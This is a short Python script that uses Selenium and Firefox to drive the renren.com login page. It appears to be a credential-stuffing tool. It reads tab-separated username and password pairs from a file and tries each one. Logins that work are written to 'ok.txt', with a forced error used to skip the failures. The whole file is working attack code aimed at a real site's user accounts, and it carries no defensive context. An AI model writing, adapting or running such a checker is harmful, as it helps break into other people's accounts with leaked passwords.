#!/usr/bin/env python
#-*- coding:utf-8 -*-
from selenium import webdriver
import time
browser=webdriver.Firefox(firefox_profile='/root/.mozilla/firefox/6gyv7tzu.default')

def check(user,passwd):
    browser.delete_all_cookies()
    browser.get('http://www.renren.com/SysHome.do')
    time.sleep(1)
    #print(user)
    #print(passwd )
    browser.find_element_by_xpath(".//*[@id='email']").clear()
    browser.find_element_by_xpath(".//*[@id='email']").send_keys(user)
    browser.find_element_by_xpath(".//*[@id='password']").send_keys(passwd)
    browser.find_element_by_xpath(".//*[@id='login']").click()
    time.sleep(1)
    if browser.current_url=='http://www.renren.com/SysHome.do':
        print(1/0)
#a = raw_input('If you are ready,please click [Enter]')
n=1
with open("renren.txt") as f:
    for line in f:
        print('now checking line:'+str(n))
        try:
            check(line.split('\t')[0].strip(),line.split('\t')[1].strip())
            print("I got it! The answer is "+line)
            with open("ok.txt",'a+') as f1:
                f1.write(line)
        except:
            #x = input('continue?')
            continue
        finally:
            n=n+1
